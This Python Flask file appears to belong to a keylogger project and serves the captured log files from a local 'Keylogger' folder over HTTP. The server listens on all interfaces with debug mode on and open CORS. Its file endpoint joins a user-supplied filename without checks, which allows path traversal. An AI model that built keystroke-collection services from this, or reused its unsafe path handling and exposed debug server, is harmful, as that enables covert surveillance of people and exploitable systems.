import json
import os
import subprocess
import sys

from write_to_file import WriteToFile

from flask import Flask, jsonify, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
date_time = WriteToFile.timer_days()
FILE_PATH = f"C:/Users/shuki/Desktop/Keylogger/{date_time}.json"
@app.route("/start-recording",methods=['GET'])
def start_recording():
    data = {"status":"recording started"}
    return jsonify(data)
@app.route("/1",methods=['GET'])
def body():
    return "yakov מה הולך?"
@app.route("/getData",methods=['GET'])
def get_Data():
    try:
        with open(FILE_PATH,"r",encoding="utf-8") as file:
            data = json.load(file)
        return jsonify({"content":data})
        # return jsonify({"content":content})
    except FileNotFoundError:
        return jsonify({"error":"file not found"}), 404


DIRECTORY_PATH = f"C:/Users/shuki/Desktop/Keylogger/"
@app.route("/list-files", methods=['GET'])
def list_files():
    try:
        files = [f for f in os.listdir(DIRECTORY_PATH) if f.endswith(".json")]  # רק קבצי JSON
        return jsonify({"files": files})
    except Exception as e:
        return jsonify({"error": f"Error reading directory: {str(e)}"}), 500


@app.route("/get-file", methods=['POST'])
def get_file():
    try:
        data = request.json
        file_name = data.get("filename")
        if not file_name:
            return jsonify({"error": "Filename not provided"}), 400

        file_path = os.path.join(DIRECTORY_PATH, file_name)

        if not os.path.exists(file_path):
            return jsonify({"error": "File not found"}), 404

        with open(file_path, "r", encoding="utf-8") as file:
            file_data = json.load(file)
        return jsonify({"content": file_data})

    except Exception as e:
        return jsonify({"error": f"Unexpected error: {str(e)}"}), 500






if __name__ == '__main__':

    app.run(host="0.0.0.0",port=5000,debug=True)